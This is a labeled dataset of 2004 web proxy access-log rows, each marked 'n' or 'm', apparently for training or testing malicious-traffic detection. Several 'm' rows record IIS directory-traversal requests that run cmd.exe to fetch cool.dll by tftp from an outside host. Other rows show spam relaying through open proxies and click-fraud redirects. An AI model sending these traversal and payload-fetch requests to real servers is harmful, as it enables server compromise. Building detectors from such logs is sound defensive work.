rowIndex, row, class
481, 66.36.242.145 - - [09/Mar/2004:23:41:18 -0500] "GET http://www.webconnections.net/cgi-bin/whois.cgi?domain=63.227.76.27&stripheader=1&quiet=1 HTTP/1.1" 200 1516 "-" "-", n
482, 66.36.242.145 - - [09/Mar/2004:23:41:20 -0500] "GET http://www.webconnections.net/cgi-bin/whois.cgi?domain=63.227.76.27&stripheader=1&quiet=1 HTTP/1.1" 200 1504 "-" "-", n
483, 221.7.192.11 - - [09/Mar/2004:23:41:21 -0500] "GET http://ccbbs.cn/index.asp HTTP/1.1" 200 12711 "http://ccbbs.cn/index.asp" "Mozilla/4.75 [en] (Win98; I)", n
484, 66.36.242.145 - - [09/Mar/2004:23:41:38 -0500] "GET http://www.checker.freeproxy.ru/checker/last_checked_proxies.php HTTP/1.1" 200 17664 "-" "-", n
485, 66.36.242.145 - - [09/Mar/2004:23:41:41 -0500] "GET http://www.void.ru/ HTTP/1.1" 200 54228 "-" "-", n
486, 66.36.242.145 - - [09/Mar/2004:23:41:44 -0500] "GET http://onlinechecker.freeproxy.ru/free_proxy_lists.php HTTP/1.1" 200 12416 "-" "-", n
487, 66.36.242.145 - - [09/Mar/2004:23:41:45 -0500] "GET http://onlinechecker.freeproxy.ru/free_proxy_lists.php HTTP/1.1" 200 12416 "-" "-", n
488, 66.36.242.145 - - [09/Mar/2004:23:41:46 -0500] "GET http://www.stayinvisible.com/index.php?module=database&func=view&did=1&orderby=3&order=asc&page=6 HTTP/1.1" 404 215 "-" "-", n
489, 68.48.142.117 - - [09/Mar/2004:23:41:50 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
490, 66.36.242.145 - - [09/Mar/2004:23:42:10 -0500] "CONNECT irc.dal.net:6667 HTTP/1.0" 500 434 "-" "-", n
491, 66.36.242.145 - - [09/Mar/2004:23:42:21 -0500] "GET http://www.webconnections.net/cgi-bin/whois.cgi?domain=217.35.113.189&stripheader=1&quiet=1 HTTP/1.1" 200 3649 "-" "-", n
492, 66.36.242.145 - - [09/Mar/2004:23:42:22 -0500] "GET http://www.webconnections.net/cgi-bin/whois.cgi?domain=200.30.165.138&stripheader=1&quiet=1 HTTP/1.1" 200 2118 "-" "-", n
493, 66.36.242.145 - - [09/Mar/2004:23:42:25 -0500] "GET http://www.webconnections.net/cgi-bin/whois.cgi?domain=200.30.165.138&stripheader=1&quiet=1 HTTP/1.1" 200 2118 "-" "-", n
494, 66.36.242.145 - - [09/Mar/2004:23:42:25 -0500] "GET http://www.webconnections.net/cgi-bin/whois.cgi?domain=217.35.113.189&stripheader=1&quiet=1 HTTP/1.1" 200 3649 "-" "-", n
495, 66.36.242.145 - - [09/Mar/2004:23:42:30 -0500] "GET http://www.checker.freeproxy.ru/checker/last_checked_proxies.php HTTP/1.1" 200 17644 "-" "-", n
496, 66.36.242.145 - - [09/Mar/2004:23:42:33 -0500] "GET http://www.checker.freeproxy.ru/checker/last_checked_proxies.php HTTP/1.1" 200 17664 "-" "-", n
497, 66.36.242.145 - - [09/Mar/2004:23:42:36 -0500] "GET http://www.void.ru/ HTTP/1.1" 200 54210 "-" "-", n
498, 66.36.242.145 - - [09/Mar/2004:23:42:39 -0500] "GET http://onlinechecker.freeproxy.ru/free_proxy_lists.php HTTP/1.1" 200 12416 "-" "-", n
499, 66.36.242.145 - - [09/Mar/2004:23:42:40 -0500] "GET http://onlinechecker.freeproxy.ru/free_proxy_lists.php HTTP/1.1" 200 12416 "-" "-", n
500, 68.48.142.117 - - [09/Mar/2004:23:42:40 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
501, 66.36.242.145 - - [09/Mar/2004:23:42:51 -0500] "GET http://surfsafe.cpc-net.org/modules.php?op=modload&name=Tools&file=proxies&offset=4 HTTP/1.1" 500 538 "-" "-", n
502, 68.48.142.117 - - [09/Mar/2004:23:43:31 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
503, 192.117.242.67 - - [09/Mar/2004:23:43:49 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
504, 68.48.142.117 - - [09/Mar/2004:23:44:21 -0500] "GET /scripts/..%25%35%63../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
505, 203.121.182.189 - - [09/Mar/2004:23:44:26 -0500] "CONNECT 211.116.247.13:25 HTTP/1.0" 200 - "-" "-", n
506, 66.36.242.145 - - [09/Mar/2004:23:45:04 -0500] "GET http://www.checker.freeproxy.ru/checker/last_checked_proxies.php HTTP/1.1" 200 17650 "-" "-", n
507, 68.48.142.117 - - [09/Mar/2004:23:45:11 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
508, 68.48.142.117 - - [09/Mar/2004:23:46:01 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
509, 61.172.244.216 - - [09/Mar/2004:23:46:09 -0500] "CONNECT 210.242.13.186:25 HTTP/1.0" 200 - "-" "-", n
510, 192.117.242.67 - - [09/Mar/2004:23:46:09 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
511, 192.117.242.67 - - [09/Mar/2004:23:46:10 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
512, 68.48.142.117 - - [09/Mar/2004:23:46:51 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
513, 24.235.131.196 - - [09/Mar/2004:23:47:03 -0500] "GET http://www.184u.com/iframe.php HTTP/1.0" 301 0 "http://www.184u.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
514, 203.121.182.144 - - [09/Mar/2004:23:47:35 -0500] "CONNECT 209.15.20.82:25 HTTP/1.0" 200 - "-" "-", n
515, 68.48.142.117 - - [09/Mar/2004:23:47:41 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
516, 218.78.209.42 - - [09/Mar/2004:23:47:54 -0500] "CONNECT 209.15.20.48:25 HTTP/1.0" 200 - "-" "-", n
517, 68.48.142.117 - - [09/Mar/2004:23:48:31 -0500] "GET /scripts/..%252f../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
518, 24.235.131.196 - - [09/Mar/2004:23:48:34 -0500] "GET http://www.1latinsex.com/iframe.php HTTP/1.0" 500 416 "http://www.1latinsex.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
519, 213.112.232.43 - - [09/Mar/2004:23:48:49 -0500] "GET http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi HTTP/1.0" 200 2046 "-" "Mozilla/4.0", n
520, 192.117.242.67 - - [09/Mar/2004:23:48:51 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
521, 66.36.242.145 - - [09/Mar/2004:23:48:52 -0500] "GET http://www.checker.freeproxy.ru/checker/last_checked_proxies.php HTTP/1.1" 200 17664 "-" "-", n
522, 66.36.242.145 - - [09/Mar/2004:23:49:16 -0500] "GET http://www.above.net/cgi-bin/trace?203.199.64.132 HTTP/1.1" 200 578 "-" "-", n
523, 66.36.242.145 - - [09/Mar/2004:23:49:36 -0500] "GET http://www.chinanetmap.com/cgi-bin/trace/trace.sh?203.199.64.132 HTTP/1.1" 200 578 "-" "-", n
524, 24.235.131.196 - - [09/Mar/2004:23:49:41 -0500] "GET http://www.acumbabe.com/iframe.php HTTP/1.0" 404 6010 "http://www.acumbabe.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
525, 66.36.242.145 - - [09/Mar/2004:23:49:46 -0500] "GET http://www.checker.freeproxy.ru/checker/last_checked_proxies.php HTTP/1.1" 200 17650 "-" "-", n
526, 66.36.242.145 - - [09/Mar/2004:23:49:46 -0500] "GET http://atlas.bit.net.au/cgi-bin/nph-traceroute?203.199.64.132 HTTP/1.1" 200 578 "-" "-", n
527, 66.36.242.145 - - [09/Mar/2004:23:49:56 -0500] "GET http://www.saix.net/cgi-bin/tools/trace.cgi?203.199.64.132 HTTP/1.1" 200 578 "-" "-", n
528, 24.235.131.196 - - [09/Mar/2004:23:50:32 -0500] "GET http://www.adultcontentpics.com/iframe.php HTTP/1.0" 500 430 "http://www.adultcontentpics.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
529, 24.235.131.196 - - [09/Mar/2004:23:50:51 -0500] "GET http://www.absex.org/iframe.php HTTP/1.0" 500 408 "http://www.absex.org/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
530, 218.29.56.234 - - [09/Mar/2004:23:50:51 -0500] "GET http://www.searchwallet.com/cgi-bin/smartsearch.cgi?username=minon&keywords=POS HTTP/1.1" 200 12235 "http://free.hostdepartment.com/s/sunboyi/searchwallet.html" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", m
531, 221.7.192.11 - - [09/Mar/2004:23:50:53 -0500] "GET http://www.ccbbs.cn/ HTTP/1.1" 200 12711 "http://www.ccbbs.cn" "Mozilla/4.75 [en] (Win98; I)", n
532, 66.36.242.145 - - [09/Mar/2004:23:51:05 -0500] "GET http://www.debug.net/connectivity/?203.199.64.132 HTTP/1.1" 200 3100 "-" "-", n
533, 212.160.136.163 - - [09/Mar/2004:23:51:05 -0500] "GET http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free HTTP/1.0" 200 41914 "http://www.bodybuilding.ifbbpro.net/" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
534, 212.160.136.163 - - [09/Mar/2004:23:51:08 -0500] "GET http://www.blowsearch.com/r.php?mc=rresCCC3240512629GGGfreePPP2QQQ23PPP3290019082PPP80QQQ60QQQ328QQQ321BBB3240512629BBB3290016482PPP80QQQ60QQQ328QQQ321PPPblowsearch=xpwAAAxpw=QV?vtpsDDDe/upenrf/ynpbyOOOvtp/zbpDDDxpvhdOOOgvqavsDDDjjj//CCCcgguCCCCCCMMM112CCCCCC711DDD1CCCCCCrresCCCCCC2735099812OOO4941118308OOO012DDD712DDD95DDD97CCCCCC2798099812CCCCCC012DDD712DDD95DDD97CCCCCCajbeomCCCCCC]xpvhDgVqavS[CCCCCC4941118308&v=a5959243a4c81e8e9c87fc6e7e9b47ba HTTP/1.0" 302 2 "http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", m
535, 192.117.242.67 - - [09/Mar/2004:23:51:08 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
536, 192.117.242.67 - - [09/Mar/2004:23:51:09 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
537, 212.160.136.163 - - [09/Mar/2004:23:51:10 -0500] "GET http://www.findit-quick.com/cgi-local/search/r.fcgi?ID=jck&jck=upenrfjbyoCCC012DDD712DDD95DDD97CCC1735099812OOO8151049312OOO012DDD712DDD95DDD97CCC1798099812CCC21DDD1CCCrresTTT8151049312:free HTTP/1.0" 302 315 "http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", m
538, 212.160.136.163 - - [09/Mar/2004:23:51:11 -0500] "GET http://xray-eye.com/word.php?searchkeyword=free&ds=yes HTTP/1.0" 302 8471 "http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
539, 212.160.136.163 - - [09/Mar/2004:23:51:13 -0500] "GET http://xray-eye.com/redir.php?idk=15400480 HTTP/1.0" 302 0 "http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
540, 212.160.136.163 - - [09/Mar/2004:23:51:14 -0500] "GET http://c.ah-ha.com/c?e1=eD1Oxv5QolLEaEShzbexuODcut0KWfl3qvPRYtQxlE43r1x3oLlhosU1aVEIKPVjT2yjeCZc5vSzVDwkY2WHRloERa1MiM2FbxfTH4ba1zFXZ3HHjpz3i1RP3kKHGhzgSmXlqpMEmvfvJqkLPClEqHZhfLmJNZxkCB3pfnrXylv45LKdkCdvkcCvYvFaeM1bJH3JobVzVNwXUj0TZam1PuKcFKumFFUvoQCFI5kSJdfTMpCPT&h=eaxhmJYvMFoqWxDBT&b=65154 HTTP/1.0" 302 0 "http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", m
541, 24.235.131.196 - - [09/Mar/2004:23:51:14 -0500] "GET http://www.adultswinging.com/iframe.php HTTP/1.0" 302 0 "http://www.adultswinging.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
542, 212.160.136.163 - - [09/Mar/2004:23:51:15 -0500] "GET http://c.ah-ha.com/c/2?e1=eD1Oxv5QolLEaEShzbexuODcut0KWfl3qvPRYtQxlE43r1x3oLlhosU1aVEIKPVjT2yjeCZc5vSzVDwkY2WHRloERa1MiM2FbxfTH4ba1zFXZ3HHjpz3i1RP3kKHGhzgSmXlqpMEmvfvJqkLPClEqHZhfLmJNZxkCB3pfnrXylv45LKdkCdvkcCvYvFaeM1bJH3JobVzVNwXUj0TZam1PuKcFKumFFUvoQCFI5kSJdfTMpCPT&h=eaxhmJYvMFoqWxDBT&b=65154 HTTP/1.0" 302 0 "http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", m
543, 212.160.136.163 - - [09/Mar/2004:23:51:19 -0500] "GET http://www.kazaa-gold.com/ HTTP/1.0" 200 16435 "http://www.blowsearch.com/search.php?affiliate=zbrown&keywords=free" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
544, 61.53.76.40 - - [09/Mar/2004:23:51:32 -0500] "POST http://69.59.175.60/found-best.com/search.php HTTP/1.0" 200 20175 "http://www.annies-biz.com/pages/ptc.php" "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)", n
545, 218.29.56.234 - - [09/Mar/2004:23:51:46 -0500] "GET http://www.searchwallet.com/cgi-bin/sf.cgi?t=n0&keys=fmhihzaa5b4smsicozcfmdpfafksvsocvcnachidcfzdzzhxdhnakhospddsmsixdczazdmdfaadxffcsxkaohofiasamzscochapfhakfzapzhahzcsmhofsddsmsixdzczifadfassvzihohvachospsyhsszzcciasfsasdmsydohacmacfoddsysazzxczcscaifadfavfchocnacdkaidyhxshxcxdznhnspfzskfdcscmamdkdxfzazdscsxsznfzdfdiahzzcaxdzidfaafzahdzahcnzkhndxddssdzzcxkaxhndxskapdncacmszaoaadfsndocsczzvdpfadyhadacoxsshfadfdihxzhzmchzydkdfdyszdahocnzoanfafxsyfxcscmasfzfadfacdscocpszaahzasavdahsxdzhfisxfvsnzhzphvahfxsxfvhcszahzcaphadfddsmsihoczzhdfsxfvhdzixdzcayfxfoddhpdmzcxkacfcsmdyhpfdhoxkaahadfskhpadahcpznfxhhskaczszmzxsmaadfaaazzicazcahfvaifxhdzixdzcayfxfoddsmshazhnzyhaspfxhhdmxfhnziaofifkhdzixdzcayfxfodddzfyazzcacaaffdisnfxzpxdfmdpdxfzskffazcfacaafffkhcdmcsxdazfzdxfzsnzaxxcmzihidcdihasocvcmzidkdxdyhcsaxccmzyfcfafzzkschhhvsyaphxzpsozoznakzphaazzxafzhznayadhkhyzphxamazzcadhnhfzysoznzhzkakaizsansaacaphnavspsiafaasosaznaksvasszzkziacanzyhhaxsnshzpzzhiayzchzhahmzxsvapznhpznzohszzsvayzohpzvhahvaczszksvhhayamsmhdzczmaoakaizddffdsaaizohnznzkhkszhazc&kw=pos HTTP/1.1" 302 269 "http://www.searchwallet.com/cgi-bin/smartsearch.cgi?username=minon&keywords=POS" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", m
546, 80.54.146.135 - - [09/Mar/2004:23:51:52 -0500] "GET http://mine-seek.com/search.php?ID=2&fString=buy+meridia HTTP/1.0" 302 0 "http://www.just-seek.com/julias/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", n
547, 80.54.146.135 - - [09/Mar/2004:23:52:03 -0500] "GET http://mine-seek.com/search_results.php?fSearch_id=ae85838372a83f6f&fString=buy+meridia HTTP/1.0" 200 15720 "http://www.just-seek.com/julias/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", n
548, 80.54.146.135 - - [09/Mar/2004:23:52:04 -0500] "GET http://mine-seek.com/redirect.php?fID=2830167 HTTP/1.0" 302 0 "http://mine-seek.com/search_results.php?fSearch_id=ae85838372a83f6f&fString=buy+meridia" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", n
549, 80.54.146.135 - - [09/Mar/2004:23:52:04 -0500] "GET http://feed.genieknows.com/search/xml/Monitor?enc=wo%24y%25uMx%25%25%21J%3F%3F%28%28%28%3Eu%21y%7C+%25%3Es+%7D%3Fs%7Cys%7B%3Eq%24%21%29O%7BMr%26*%3B%7Du%23ytyq6q%7D%21KrMG%40%406q%7D%21K%21Mu%21y%7C+%256q%7D%21K%24Mwu%7EyuD6q%7D%21K%21+%24MA6q%7D%21K%25MBD6q%7D%21K%7BytMItBvArFB%3DCHAG%3DDGsI%3DHrGF%3DtvDIvEutEqHI6q%7D%21Ku%21MB6q%7D%21K%24ytMqEFstrt%40%3DtBFD%3DDIHB%3DHuBA%3DIGAuFutEA%40Gv6q%7D%21K%7CMx%25%25%21J5BV5BV+%7E%7Cy%7Eu%3D%21%23u%24s%23y%21%25y+%7E%3Dt%23%26w%24%3D%7Dutysq%25y+%7E%24%3Es+%7D5BVy%7Etu%29%3E%21x%215CV%21%23+t%26s%25oytMBA5BF%7Cq%7Ew%26qwuoytMA5BFqMu%21y%7C+%255BFrM%7Du%23ytyq6worytM%40%3E%40DB6s+ro%27q%7CM%40%3E%40ADFIIIIIH%40AHADEEF6wo%22%23*Mr%26*%3B%7Du%23ytyq6woqvvytMBF6woy%21MFH%3EDH%3EA%40F%3EA%40I6wosqsxuM%5E6wos%7CytM%5DY%5EUcUU%5BoE%40G%40%01 HTTP/1.0" 200 566 "http://mine-seek.com/search_results.php?fSearch_id=ae85838372a83f6f&fString=buy+meridia" "Mozilla/4.0 (compatible; MSIE 5.5; Windows ME)", m
550, 24.235.131.196 - - [09/Mar/2004:23:52:54 -0500] "GET http://www.allteensex.org/iframe.php HTTP/1.0" 302 205 "http://www.allteensex.org/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", m
551, 24.235.131.196 - - [09/Mar/2004:23:53:13 -0500] "GET http://www.alternate-earth.com/iframe.php HTTP/1.0" 404 1382 "http://www.alternate-earth.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
552, 24.235.131.196 - - [09/Mar/2004:23:53:17 -0500] "GET http://www.allteens.com/iframe.php HTTP/1.0" 302 0 "http://www.allteens.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
553, 192.117.242.67 - - [09/Mar/2004:23:53:54 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
554, 24.235.131.196 - - [09/Mar/2004:23:55:27 -0500] "GET http://www.americansexe.com/iframe.php HTTP/1.0" 500 422 "http://www.americansexe.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
555, 217.136.205.206 - - [09/Mar/2004:23:55:27 -0500] "GET http://members.asstraffic.com/secure/pages/index.php HTTP/1.0" 200 566 "http://members.asstraffic.com:80" "Mozilla/4.7 ( compatible; MSIE 5.01; Windows NT5.0; DigiExt )", n
556, 202.205.89.188 - - [09/Mar/2004:23:55:48 -0500] "GET http://proxyjudge.org/prxjdg.cgi HTTP/1.0" 200 1257 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)", n
557, 202.205.89.188 - - [09/Mar/2004:23:55:49 -0500] "GET http://www.stayinvisible.com/index.pl/ip_test_result_nocache HTTP/1.0" 200 8030 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)", n
558, 24.235.131.196 - - [09/Mar/2004:23:56:00 -0500] "GET http://www.analassault.com/iframe.php HTTP/1.0" 302 0 "http://www.analassault.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
559, 202.205.89.188 - - [09/Mar/2004:23:56:04 -0500] "GET http://www.enjoysearching.com/cgi-bin/smartsearch.cgi?username=tina&keywords=jobs HTTP/1.0" 200 26382 "http://202.205.89.188/english/ppc/enjoy.htm" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
560, 192.117.242.67 - - [09/Mar/2004:23:56:07 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
561, 192.117.242.67 - - [09/Mar/2004:23:56:07 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
562, 202.205.89.188 - - [09/Mar/2004:23:56:11 -0500] "GET http://www.enjoysearching.com/cgi-bin/sf.cgi?t=sd&keys=shaohiaizihahiamzcafaohizchkszzhaxsysdsnhfsvanzyaksazshmaosoassksdzfzcavskzyaaavzosxzzhfsfaiazhfahafsosvhoaozchksihhdsfohhaaavhmzchazcsfhazx&kw=jobs&keys2=zkhnhzzohszzapzchpfmahdsdvdoaxzzdndpffszfizshacpdffzhmsmzhzccccysisofndaacddzhzcdddmfxfxdvzaxzcpdmfsaxzyacapcihsaafhsoadshaycfzasksfdadaffzxcozcfhfddzsyfzzahazndcdoayadfhaxcpcpdmsfaaayassoahzhfnavhffnsmzahhczfyfdfsdfdczxxdhaapsdakdvssfohfxofhaishdfhdfcxzaiamaosvdcsyfazcchdffcssfvsvsxhhzhdcsvdiscafdmaxcxsifxsidxfydfcfcczisvfxfkfffchkxmamsvdisxdcfsxfcmadsidaahhsdyzscasvfdszahavdszicfdoaaskszhxfahhaosvfpshdzamakcnaofzszsodhfhascdapzndpayahfxafcmcishhnfizissszzzzodydksnfcshaxaczpskhnacfyaffszhhvfhaaszdphcaizicmzodvazzdhfsxanhvhdafszskzoamhfszsvscznskzihpaozpamsyadzdapaszysyadayshafskznxcxyhphnhzzkzozhaphnspsx&kw=jobs HTTP/1.0" 302 941 "http://www.enjoysearching.com/cgi-bin/smartsearch.cgi?username=tina&keywords=jobs" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", m
563, 202.205.89.188 - - [09/Mar/2004:23:56:21 -0500] "GET http://www.searchdrifter.com/cgi-bin/sf.cgi?t=ha&keys=zkhnhzzohszzapzchpfmahdsdvdoaxzzdndpffszfizshacpdffzhmsmzhzccccysisofndaacddzhzcdddmfxfxdvzaxzcpdmfsaxzyacapcihsaafhsoadshaycfzasksfdadaffzxcozcfhfddzsyfzzahazndcdoayadfhaxcpcpdmsfaaayassoahzhfnavhffnsmzahhczfyfdfsdfdczxxdhaapsdakdvssfohfxofhaishdfhdfcxzaiamaosvdcsyfazcchdffcssfvsvsxhhzhdcsvdiscafdmaxcxsifxsidxfydfcfcczisvfxfkfffchkxmamsvdisxdcfsxfcmadsidaahhsdyzscasvfdszahavdszicfdoaaskszhxfahhaosvfpshdzamakcnaofzszsodhfhascdapzndpayahfxafcmcishhnfizissszzzzodydksnfcshaxaczpskhnacfyaffszhhvfhaaszdphcaizicmzodvazzdhfsxanhvhdafszskzoamhfszsvscznskzihpaozpamsyadzdapaszysyadayshafskznxcxyhphnhzzkzozhaphnspsx&kw=jobs HTTP/1.0" 302 549 "http://www.enjoysearching.com/cgi-bin/smartsearch.cgi?username=tina&keywords=jobs" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", m
564, 202.205.89.188 - - [09/Mar/2004:23:56:22 -0500] "GET http://c.ah-ha.com/c?e1=eD1Oxv5QolLcoHdDc0ep1osKaIPqpdp2W0lRYtQxlE43QrSXxyK4BxkWpOh4eG4mulNXxRmxoXhUtW3xJqbOHHHlMntElFNCNn0BRTYVwBcA0AdkMnWyeewJsAAYnGyUbht5FF0YpgLGhKpTkxskG2HYSXFZe4uI4dGy2kfnjwTPZoSzlHWni4TdEXLbW2NBJweuRwszxZzlXbh1dUTPF4MLNFBboShBArcSN3&h=YAPi5BmQEQz0UMAfP&b=133202 HTTP/1.0" 302 0 "http://www.enjoysearching.com/cgi-bin/smartsearch.cgi?username=tina&keywords=jobs" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", m
565, 202.205.89.188 - - [09/Mar/2004:23:56:23 -0500] "GET http://c.ah-ha.com/c/2?e1=eD1Oxv5QolLcoHdDc0ep1osKaIPqpdp2W0lRYtQxlE43QrSXxyK4BxkWpOh4eG4mulNXxRmxoXhUtW3xJqbOHHHlMntElFNCNn0BRTYVwBcA0AdkMnWyeewJsAAYnGyUbht5FF0YpgLGhKpTkxskG2HYSXFZe4uI4dGy2kfnjwTPZoSzlHWni4TdEXLbW2NBJweuRwszxZzlXbh1dUTPF4MLNFBboShBArcSN3&h=YAPi5BmQEQz0UMAfP&b=133202 HTTP/1.0" 302 0 "http://www.enjoysearching.com/cgi-bin/smartsearch.cgi?username=tina&keywords=jobs" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", m
566, 202.205.89.188 - - [09/Mar/2004:23:56:27 -0500] "GET http://www.radiofreeq.com/ HTTP/1.0" 200 15770 "http://www.enjoysearching.com/cgi-bin/smartsearch.cgi?username=tina&keywords=jobs" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
567, 24.235.131.196 - - [09/Mar/2004:23:56:50 -0500] "GET http://www.am-ass.com/iframe.php HTTP/1.0" 502 529 "http://www.am-ass.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
568, 24.235.131.196 - - [09/Mar/2004:23:57:46 -0500] "GET http://www.art-nudes.de/iframe.php HTTP/1.0" 404 2118 "http://www.art-nudes.de/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
569, 61.172.244.216 - - [09/Mar/2004:23:58:12 -0500] "CONNECT 207.137.186.108:25 HTTP/1.0" 200 - "-" "-", n
570, 192.117.242.67 - - [09/Mar/2004:23:58:53 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
571, 24.235.131.196 - - [09/Mar/2004:23:59:00 -0500] "GET http://www.asja.org/iframe.php HTTP/1.0" 404 191 "http://www.asja.org/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
572, 24.235.131.196 - - [09/Mar/2004:23:59:08 -0500] "GET http://www.amateuryouth.com/iframe.php HTTP/1.0" 502 541 "http://www.amateuryouth.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
573, 24.235.131.196 - - [09/Mar/2004:23:59:09 -0500] "GET http://www.amatkingdom.com/iframe.php HTTP/1.0" 502 539 "http://www.amatkingdom.com/iframe.php" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)", n
